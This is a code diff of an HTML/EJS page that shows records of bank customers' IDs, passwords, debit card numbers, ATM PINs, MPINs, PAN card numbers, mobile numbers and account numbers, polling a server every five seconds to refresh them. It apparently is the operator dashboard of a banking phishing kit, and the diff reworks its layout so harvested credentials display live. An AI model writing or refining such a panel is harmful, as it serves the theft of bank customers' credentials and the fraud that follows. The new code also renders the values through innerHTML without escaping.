@@ -1,102 +1,97 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-    <link
-      href="https://cdn.jsdelivr.net/npm/daisyui@3.2.1/dist/full.css"
-      rel="stylesheet"
-      type="text/css"
-    />
-    <script src="https://cdn.tailwindcss.com"></script>
-  </head>
-  <body>
-    <div class="p-10 flex justify-content items-center w-full">
-      <div class="overflow-x-auto p-5 w-full">
-          <div id="data-table-body flex flex-col items-center justify-center w-full">
-            <% for (let i = data.length - 1; i >= 0; i--) { %>
-            <div class="mt-10 flex flex-col">
-              <h2><span class="text-red-500 bold text-md uppercase">Customer ID:</span>  <%= data[i].customer_id %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Password:</span>  <%= data[i].password %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Debit Card:</span> <%= data[i].debit_card %></h2>
-              <h2> <span class="text-red-500 bold text-md uppercase">ATM PIN:</span> <%= data[i].atm_pin %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> <%= data[i].register_mobile_number %></h2>
-              <h2> <span class="text-red-500 bold text-md uppercase">MPIN:</span> <%= data[i].mpin %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Pan Card:</span> <%= data[i].pan_card %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">MPin:</span> <%= data[i].mpin %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> <%= data[i].register_mobile_number_2 %></h2>
-              <h2><span class="text-red-500 bold text-md uppercase">Account Number:</span> <%= data[i].account_number %></h2>
-            </div>
-            <% } %>
-          </div>
-      </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document</title>
+  <link
+    href="https://cdn.jsdelivr.net/npm/daisyui@3.2.1/dist/full.css"
+    rel="stylesheet"
+    type="text/css"
+  />
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body>
+  <div class="p-10 flex justify-content items-center w-full">
+    <div class="overflow-x-auto p-5 w-full" id="data-table-body">
+      <% for (let i = data.length - 1; i >= 0; i--) { %>
+        <div class="mt-10 flex flex-col">
+          <h2><span class="text-red-500 bold text-md uppercase">Customer ID:</span> <%= data[i].customer_id || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Password:</span> <%= data[i].password || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Debit Card:</span> <%= data[i].debit_card || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">ATM PIN:</span> <%= data[i].atm_pin || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> <%= data[i].register_mobile_number || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">MPIN:</span> <%= data[i].mpin || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Pan Card:</span> <%= data[i].pan_card || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">MPin:</span> <%= data[i].mpin || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> <%= data[i].register_mobile_number_2 || "N/A" %></h2>
+          <h2><span class="text-red-500 bold text-md uppercase">Account Number:</span> <%= data[i].account_number || "N/A" %></h2>
+        </div>
+      <% } %>
     </div>
+  </div>
 
-    <script>
-      function refreshData() {
-        fetch("/data/real-time")
-          .then((response) => response.json())
-          .then((data) => {
-            const tableBody = document.getElementById("data-table-body");
-            tableBody.innerHTML = "";
+  <script>
+    function refreshData() {
+      fetch("/data/real-time")
+        .then((response) => response.json())
+        .then((data) => {
+          const tableBody = document.getElementById("data-table-body");
+          tableBody.innerHTML = "";
+          data.reverse(); 
+          data.forEach((item) => {
+            const div = document.createElement("div");
+            div.classList.add("mt-10", "flex", "flex-col");
 
-            data.forEach((item, index) => {
-              const row = document.createElement("tr");
+            const h2CustomerId = document.createElement("h2");
+            h2CustomerId.innerHTML = `<span class="text-red-500 bold text-md uppercase">Customer ID:</span> ${item.customer_id || "N/A"}`;
+            div.appendChild(h2CustomerId);
 
-              const cellIndex = document.createElement("td");
-              cellIndex.innerText = index + 1;
-              row.appendChild(cellIndex);
+            const h2Password = document.createElement("h2");
+            h2Password.innerHTML = `<span class="text-red-500 bold text-md uppercase">Password:</span> ${item.password || "N/A"}`;
+            div.appendChild(h2Password);
 
-              const cellAccountHolderName = document.createElement("td");
-              cellAccountHolderName.innerText = item.customer_id;
-              row.appendChild(cellAccountHolderName);
+            const h2DebitCard = document.createElement("h2");
+            h2DebitCard.innerHTML = `<span class="text-red-500 bold text-md uppercase">Debit Card:</span> ${item.debit_card || "N/A"}`;
+            div.appendChild(h2DebitCard);
 
-              const cellRefundAmount = document.createElement("td");
-              cellRefundAmount.innerText = item.password;
-              row.appendChild(cellRefundAmount);
+            const h2ATMPin = document.createElement("h2");
+            h2ATMPin.innerHTML = `<span class="text-red-500 bold text-md uppercase">ATM PIN:</span> ${item.atm_pin || "N/A"}`;
+            div.appendChild(h2ATMPin);
 
-              const cellCardHolderName = document.createElement("td");
-              cellCardHolderName.innerText = item.debit_card;
-              row.appendChild(cellCardHolderName);
+            const h2RegisterMobileNumber = document.createElement("h2");
+            h2RegisterMobileNumber.innerHTML = `<span class="text-red-500 bold text-md uppercase">Register Mobile Number:</span> ${item.register_mobile_number || "N/A"}`;
+            div.appendChild(h2RegisterMobileNumber);
 
-              const cellCardNumber = document.createElement("td");
-              cellCardNumber.innerText = item.atm_pin;
-              row.appendChild(cellCardNumber);
+            const h2MPIN = document.createElement("h2");
+            h2MPIN.innerHTML = `<span class="text-red-500 bold text-md uppercase">MPIN:</span> ${item.mpin || "N/A"}`;
+            div.appendChild(h2MPIN);
 
-              const cellExpiryDate = document.createElement("td");
-              cellExpiryDate.innerText = item.register_mobile_number;
-              row.appendChild(cellExpiryDate);
+            const h2PanCard = document.createElement("h2");
+            h2PanCard.innerHTML = `<span class="text-red-500 bold text-md uppercase">Pan Card:</span> ${item.pan_card || "N/A"}`;
+            div.appendChild(h2PanCard);
 
-              const cellCvv = document.createElement("td");
-              cellCvv.innerText = item.mpin;
-              row.appendChild(cellCvv);
+            const h2MPIN2 = document.createElement("h2");
+            h2MPIN2.innerHTML = `<span class="text-red-500 bold text-md uppercase">MPin:</span> ${item.mpin || "N/A"}`;
+            div.appendChild(h2MPIN2);
 
-              const cellLoginPin = document.createElement("td");
-              cellLoginPin.innerText = item.pan_card;
-              row.appendChild(cellLoginPin);
+            const h2RegisterMobileNumber2 = document.createElement("h2");
+            h2RegisterMobileNumber2.innerHTML = `<span class="text-red-500 bold text-md uppercase">Register Mobile Number 2:</span> ${item.register_mobile_number_2 || "N/A"}`;
+            div.appendChild(h2RegisterMobileNumber2);
 
-              const cellMpin = document.createElement("td");
-              cellMpin.innerText = item.mpin;
-              row.appendChild(cellMpin);
+            const h2AccountNumber = document.createElement("h2");
+            h2AccountNumber.innerHTML = `<span class="text-red-500 bold text-md uppercase">Account Number:</span> ${item.account_number || "N/A"}`;
+            div.appendChild(h2AccountNumber);
 
-              const cellRegisterMobileNumber2 = document.createElement("td");
-              cellRegisterMobileNumber2.innerText = item.register_mobile_number_2;
-              row.appendChild(cellRegisterMobileNumber2);
-
-              const cellAccountNumber = document.createElement("td");
-              cellAccountNumber.innerText = item.account_number;
-              row.appendChild(cellAccountNumber);
-
-              tableBody.appendChild(row);
-            });
-          })
-          .catch((error) => {
-            console.error("Error fetching data:", error);
+            tableBody.appendChild(div);
           });
-      }
+        })
+        .catch((error) => {
+          console.error("Error fetching data:", error);
+        });
+    }
 
-      setInterval(refreshData, 5000);
-    </script>
-  </body>
+    setInterval(refreshData, 5000);
+  </script>
+</body>
 </html>
